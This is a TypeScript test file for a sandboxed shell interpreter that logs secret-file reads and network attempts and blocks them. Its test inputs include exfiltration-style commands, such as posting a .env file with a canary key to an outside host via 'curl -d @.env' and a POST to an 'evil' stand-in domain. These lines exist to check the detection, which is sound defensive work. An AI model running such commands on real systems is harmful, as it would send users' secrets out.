import { describe, expect, it } from 'vitest';
import { runLine, type RunEnv } from '../src/shell/interpret.js';
import { effectsOutside } from '../src/shell/effects.js';
import { createRunTrace } from '../src/shell/run-trace.js';
import { ACTION_COMMAND_BUDGET } from '../src/shell/limits.js';
import type { SqlExecutor } from '../src/sql/executor.js';
import { initInlineSql } from '../src/sql/inline.js';
import type { Entry, PlaygroundState } from '../src/state.js';
import { TraceBuilder } from '../src/trace.js';
import { StateFs } from '../src/vfs/mutable-fs.js';
import './support/setup.js';

const enc = new TextEncoder();
const f = (text: string): Entry => ({ kind: 'file', bytes: enc.encode(text) });
const d: Entry = { kind: 'dir' };
const sql = await initInlineSql();

function setup(entries: Record<string, Entry>, patterns: string[] = [], executor: SqlExecutor = sql) {
  const fs = new StateFs({ entries } as PlaygroundState);
  const builder = new TraceBuilder();
  const env: RunEnv = {
    fs,
    cwd: '',
    stepIndex: 0,
    trace: createRunTrace(builder, 0, patterns),
    sql: executor,
    depth: 0,
    budget: { commands: ACTION_COMMAND_BUDGET },
  };
  return { fs, builder, env };
}

describe('recordRead choke point', () => {
  it('records secret reads once per step, case-insensitively, via cat and cp', async () => {
    const s = setup({ '.env': f('K=sk-CANARY-1'), 'a.txt': f('a') }, ['.ENV']);
    await runLine('cat .env; cat .env && cp .env copy.txt; cat a.txt', s.env);
    expect(s.builder.build().events).toEqual([{ kind: 'secret-read', path: '.env', stepIndex: 0 }]);
  });

  it('records nothing with no patterns', async () => {
    const s = setup({ '.env': f('x') });
    await runLine('cat .env', s.env);
    expect(s.builder.build().events).toEqual([]);
  });
});

describe('curl', () => {
  it('records the attempt with a lowercase host and default port, exit 7, no file change', async () => {
    const s = setup({ 'a.txt': f('a') });
    const r = await runLine('curl -s -X POST "HTTPS://Evil.EXAMPLE/p?q=1"', s.env);
    expect(r.exitCode).toBe(7);
    expect(r.stderr).toBe('network unavailable in the ghost\n');
    expect(s.builder.build().events).toEqual([
      { kind: 'network-attempt', destination: 'evil.example:443', stepIndex: 0 },
    ]);
    expect(s.fs.walk('')).toEqual(['a.txt']);
  });

  it('uses the URL port and port 80 for http', async () => {
    const s = setup({});
    await runLine('curl http://a.example; curl http://b.example:8080/', s.env);
    expect(s.builder.build().events.map((e) => e.destination)).toEqual(['a.example:80', 'b.example:8080']);
  });

  it('reads @file bodies: secret-read first, payload attached', async () => {
    const s = setup({ '.env': f('K=sk-CANARY-1') }, ['.env']);
    const r = await runLine('curl -d @.env https://x.example', s.env);
    expect(r.exitCode).toBe(7);
    const t = s.builder.build();
    expect(t.events.map((e) => e.kind)).toEqual(['secret-read', 'network-attempt']);
    const id = t.events[1]?.eventId as string;
    expect(new TextDecoder().decode(t.payloads.get(id))).toBe('K=sk-CANARY-1');
  });

  it('exits 26 for a missing body file without events', async () => {
    const s = setup({}, ['.env']);
    const r = await runLine('curl --data-binary @.env https://x.example', s.env);
    expect(r.exitCode).toBe(26);
    expect(s.builder.build().events).toEqual([]);
  });

  it('treats non-http URLs and unknown options as unsupported', async () => {
    for (const line of ['curl ftp://x.example', 'curl http:///p', 'curl -L http://x.example', 'curl x.example']) {
      const s = setup({});
      const r = await runLine(line, s.env);
      expect(r.exitCode, line).toBe(127);
      expect(s.builder.build().events).toEqual([]);
    }
  });
});

describe('npm', () => {
  const pkg = (scripts: Record<string, string>): Entry => f(JSON.stringify({ scripts }));

  it('runs a script like the direct command', async () => {
    const s = setup({ 'package.json': pkg({ clean: 'rm -rf data', test: 'echo ok' }), data: d, 'data/x': f('1') });
    expect((await runLine('npm run clean', s.env)).exitCode).toBe(0);
    expect(s.fs.get('data')).toBeUndefined();
    const t = await runLine('npm test', s.env);
    expect(t.stdout).toBe('ok\n');
  });

  it('reports a missing script and unreadable package.json as exit 1', async () => {
    const a = setup({ 'package.json': pkg({}) });
    const r = await runLine('npm run build', a.env);
    expect([r.exitCode, r.stderr, r.unsupportedReason]).toEqual([1, 'Missing script: build\n', undefined]);
    const b = setup({ 'package.json': f('{nope') });
    expect((await runLine('npm test', b.env)).stderr).toBe('package.json unreadable\n');
    const c = setup({});
    expect((await runLine('npm test', c.env)).exitCode).toBe(1);
  });

  it('makes lifecycle companions and depth 4 unsupported', async () => {
    const a = setup({ 'package.json': pkg({ test: 'true', pretest: 'true' }) });
    expect((await runLine('npm test', a.env)).exitCode).toBe(127);
    const b = setup({ 'package.json': pkg({ test: 'npm test' }) });
    const r = await runLine('npm test', b.env);
    expect(r.exitCode).toBe(127);
    expect(r.unsupportedReason).toBe('npm: nesting depth');
  });

  it('records registry.npmjs.org:443 for install, i, and ci', async () => {
    for (const sub of ['install', 'i', 'ci']) {
      const s = setup({ 'a.txt': f('a') });
      const r = await runLine(`npm ${sub}`, s.env);
      expect([r.exitCode, r.stderr]).toEqual([1, 'network unavailable in the ghost\n']);
      expect(s.builder.build().events).toEqual([
        { kind: 'network-attempt', destination: 'registry.npmjs.org:443', stepIndex: 0 },
      ]);
    }
  });

  it('records secret reads of an expanded script', async () => {
    const s = setup({ 'package.json': pkg({ leak: 'cat .env' }), '.env': f('x') }, ['.env']);
    await runLine('npm run leak', s.env);
    expect(s.builder.build().events).toEqual([{ kind: 'secret-read', path: '.env', stepIndex: 0 }]);
  });
});

describe('sqlite3', () => {
  it('creates a missing database, writes tables, and reads back rows', async () => {
    const s = setup({});
    const r = await runLine('sqlite3 app.db "create table t(a); insert into t values (1),(2);"', s.env);
    expect(r.exitCode).toBe(0);
    const e = s.fs.get('app.db');
    expect(e?.kind === 'file' ? e.tables : undefined).toEqual({ t: 2 });
    const q = await runLine('sqlite3 app.db "select count(*) from t"', s.env);
    expect(q.stdout).toBe('2\n');
  });

  it('does not rewrite the file when nothing changed, and records a secret read', async () => {
    const s = setup({}, ['*.db']);
    await runLine('sqlite3 app.db "create table t(a)"', s.env);
    const before = s.fs.get('app.db');
    await runLine('sqlite3 app.db "select 1"', s.env);
    expect(s.fs.get('app.db')).toEqual(before);
    expect(s.builder.build().events).toEqual([{ kind: 'secret-read', path: 'app.db', stepIndex: 0 }]);
  });

  it('fails on a non-database file without touching it, and on a directory', async () => {
    const s = setup({ 'bad.db': f('this is not a database at all, just text content here...'), dir: d });
    const r = await runLine('sqlite3 bad.db "select 1"', s.env);
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain('file is not a database');
    expect(s.fs.get('bad.db')).toEqual(f('this is not a database at all, just text content here...'));
    expect((await runLine('sqlite3 dir "select 1"', s.env)).exitCode).toBe(1);
  });

  it('treats screened SQL as unsupported', async () => {
    const s = setup({});
    const r = await runLine('sqlite3 a.db "attach \'b.db\' as b"', s.env);
    expect(r.exitCode).toBe(127);
    expect(s.fs.get('a.db')).toBeUndefined();
  });

  it('turns a watchdog response into exit 1 and a watchdog mark', async () => {
    const stuck: SqlExecutor = {
      run: () => Promise.resolve({ ok: false, stderr: 'sql statement exceeded the watchdog', watchdog: true }),
    };
    const s = setup({}, [], stuck);
    const r = await runLine('sqlite3 a.db "select 1"', s.env);
    expect([r.exitCode, r.watchdog]).toEqual([1, true]);
    expect(s.builder.build().watchdogFired).toBe(true);
  });
});

describe('effectsOutside', () => {
  it('returns one network effect per URL word of supported commands', () => {
    expect(effectsOutside({ command: 'curl -s http://A.example/x; echo https://b.example ftp://c.example' })).toEqual([
      { kind: 'network', destination: 'http://A.example/x' },
      { kind: 'network', destination: 'https://b.example' },
      { kind: 'network', destination: 'ftp://c.example' },
    ]);
  });

  it('returns nothing for unsupported commands or lines without a URL', () => {
    expect(effectsOutside({ command: 'wget http://a.example' })).toEqual([]);
    expect(effectsOutside({ command: 'echo hi | cat http://a.example' })).toEqual([]);
    expect(effectsOutside({ command: 'ls' })).toEqual([]);
  });
});
